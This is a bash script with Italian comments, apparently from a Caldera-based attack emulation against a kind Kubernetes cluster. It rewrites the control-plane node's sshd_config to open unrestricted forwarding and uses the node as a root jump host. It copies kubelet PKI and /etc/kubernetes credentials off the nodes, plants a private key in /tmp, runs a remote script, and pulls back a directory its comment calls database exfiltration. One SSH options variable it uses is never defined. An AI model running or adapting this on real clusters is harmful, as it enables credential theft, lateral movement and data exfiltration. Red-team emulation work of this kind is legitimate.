#!/usr/bin/env bash
set -euo pipefail

# ========== CONFIG ==========
# Bastion (il solo server raggiungibile dal tuo host)
BASTION_USER="root"         # utente sul bastion
BASTION_HOST="kind-cluster-control-plane"
BASTION_PORT="122"
# Target interni (raggiungibili SOLO dal bastion)
TARGET_USER="root"           # utente sugli interni (se diverso, cambia qui)
TARGET_PORT="122"
REMOTE_DIR_WORKER="/host/var/lib/kubelet/pki"
REMOTE_DIR_CP="/host/etc/kubernetes"
# Chiave privata sul tuo host (usata per bastion e per i target tramite jump)
SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
# Output locale
OUT_DIR="$DATA_PATH/KC6/nodes-output"

KUBECONFIG="${KUBECONFIG:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
HOSTS_FILE="$DATA_PATH/KC6/iphost"

# ========== PRECHECK ==========
need(){ command -v "$1" >/dev/null 2>&1 || { echo "[-] manca '$1'"; exit 1; }; }
need ssh; need tar; need awk; need jq; need kubectl

[[ -f "$SSH_KEY" ]] || { echo "[-] SSH_KEY non trovato: $SSH_KEY"; exit 1; }
[[ -f "${SSH_KEY}.pub" ]] || { echo "[-] Pub key mancante: ${SSH_KEY}.pub"; exit 1; }

mkdir -p "$OUT_DIR"
TS="$(date -u +%Y%m%d-%H%M%S)"

SSH_OPTS=(
  -n
  -i "$SSH_KEY"
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=accept-new
  -o UserKnownHostsFile="$HOME/.ssh/known_hosts"
  -o IdentitiesOnly=yes
)

# Usa ProxyCommand, così il salto usa la STESSA chiave e la porta giusta
JUMP_OPTS=(
  -o ProxyCommand="ssh -i $SSH_KEY -p ${BASTION_PORT} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new -W %h:%p ${BASTION_USER}@${BASTION_HOST}"
)

# ========== 0) ABILITA FORWARDING SUL BASTION (idempotente) ==========
echo "[*] Abilito TCP forwarding sul bastion (se serve) e ricarico sshd..."

# 0.a) se è già ok, non toccare nulla
if ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" \
     'sshd -T | grep -q "^allowtcpforwarding yes$" && grep -q "^permitopen any$" <(sshd -T)'; then
  echo "[=] Forwarding già attivo sul bastion"
else
  # 0.b) applica la config in una sessione separata (può chiudersi quando invii HUP)
  ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" 'bash -s' <<'EOSH' || true
set -e
conf=/etc/ssh/sshd_config
cat >"$conf" <<'EOF'
Port 122
Protocol 2
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
UseDNS no
ChallengeResponseAuthentication no
X11Forwarding no
PrintMotd no
ClientAliveInterval 120
ClientAliveCountMax 2
# >>> abilita jump/port-forwarding
AllowTcpForwarding yes
PermitOpen any
AllowStreamLocalForwarding yes
AllowAgentForwarding yes
EOF

/usr/sbin/sshd -t
# ricarica in modo "amico" (se sshd è PID1, kill -HUP 1; altrimenti pidof)
pid="$(pidof sshd 2>/dev/null || echo 1)"
kill -HUP "$pid" || true
EOSH

  # 0.c) verifica in loop che la config sia effettiva
  ok=false
  for i in {1..6}; do
    sleep 0.5
    if ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" \
         'sshd -T | egrep -q "^allowtcpforwarding yes$|^permitopen any$"'; then
      ok=true; break
    fi
  done
  if ! $ok; then
    echo "[-] Impossibile confermare AllowTcpForwarding/PermitOpen sul bastion"; exit 1
  fi
  echo "[+] Forwarding attivo sul bastion"
fi

# ========== 1) COSTRUISCI HOSTS_FILE (se vuoto) ==========
if [[ ! -s "$HOSTS_FILE" ]]; then
  echo "[i] genero $HOSTS_FILE dai nodi worker"
  kubectl --kubeconfig "$KUBECONFIG" get nodes -o json \
  | jq -r '.items[]
    | select(.metadata.labels["node-role.kubernetes.io/control-plane"] | not)
    | "\(.status.addresses[] | select(.type=="InternalIP").address | select(test("^[0-9.]+$"))) - \(.metadata.name)"' \
  > "$HOSTS_FILE"
fi

# ========== FUNZIONI ==========
test_ssh() { # $1 user $2 host $3 port [extra...]
  ssh "${SSH_OPTS[@]}" -p "$3" "${@:4}" "$1@$2" 'echo ok' >/dev/null 2>&1 \
    && echo "[+] SSH OK -> $1@$2:$3" || { echo "[-] SSH KO -> $1@$2:$3"; return 1; }
}

fetch_dir() { # $1 user $2 host $3 port $4 dest_sub $5 rdir [extra...]
  local user="$1" host="$2" port="$3" dest_sub="$4" rdir="$5"; shift 5
  local dest="${OUT_DIR}/${dest_sub}-${TS}"
  echo "[*] ${host}: copio '${rdir}' -> ${dest}/"
  mkdir -p "$dest"
  local parent base
  parent="$(dirname "$rdir")"; base="$(basename "$rdir")"
  ssh "${SSH_OPTS[@]}" -p "$port" "$@" "$user@$host" \
    "tar -C \"\$([ -d \"$parent\" ] && echo \"$parent\" || echo /)\" -cpf - \"$base\"" \
    | tar -C "$dest" -xpf - \
    && echo "[+] ${host}: OK -> ${dest}/$base" \
    || { echo "[-] ${host}: copia FALLITA"; return 1; }
}

# ========== 2) TEST BASTION ==========
test_ssh "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" || {
  echo "   Suggerimenti: verifica DS sul control-plane e chiave in authorized_keys"; exit 1; }

# ========== 3) COPIA DAL BASTION ==========
fetch_dir "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" "bastion_${BASTION_HOST}" "$REMOTE_DIR_CP"

# ========== 4) COPIA DAI WORKER (via ProxyCommand) ==========
if [[ -s "$HOSTS_FILE" ]]; then
  while IFS= read -r line; do
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    ip="$(echo "$line" | awk -F ' *- *' '{print $1}' | xargs)"
    tag="${line#* - }"
    [[ -z "$tag" ]] && tag="$ip"

    # test ssh via jump (così buchi subito eventuali problemi)
    if ! test_ssh "$TARGET_USER" "$ip" "$TARGET_PORT" "${SSH_JUMP_OPTS[@]}"; then
      echo "   (skip $ip)"; continue
    fi

    fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "$REMOTE_DIR_WORKER" \
      "${SSH_JUMP_OPTS[@]}"

    # Eseguo l'esfiltrazione dai DBs
    scp -i "$SSH_KEY" -P 122 "/opt/caldera/KC4/container-admin1.sh" root@kind-cluster-control-plane:/tmp/container-admin1.sh
    scp -i "$SSH_KEY" -P 122 "$SSH_KEY" root@kind-cluster-control-plane:/tmp/key
    ssh -i "$SSH_KEY" -n -p 122 root@kind-cluster-control-plane 'chmod +x /tmp/container-admin1.sh'
    echo "Run script in pod"
    ssh -i $SSH_KEY -p 122 -n root@kind-cluster-control-plane "ssh -i /tmp/key -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -p 122 root@$ip '/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
    fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "/tmp/exfiltration/dbs" \
      "${SSH_JUMP_OPTS[@]}"
    ssh -i "$SSH_KEY" -p 122 -n root@kind-cluster-control-plane 'rm -f /tmp/key'
      
  done < "$HOSTS_FILE"
else
  echo "[!] HOSTS_FILE vuoto: $HOSTS_FILE"
fi

echo "[✓] Fatto. Output in: $OUT_DIR"
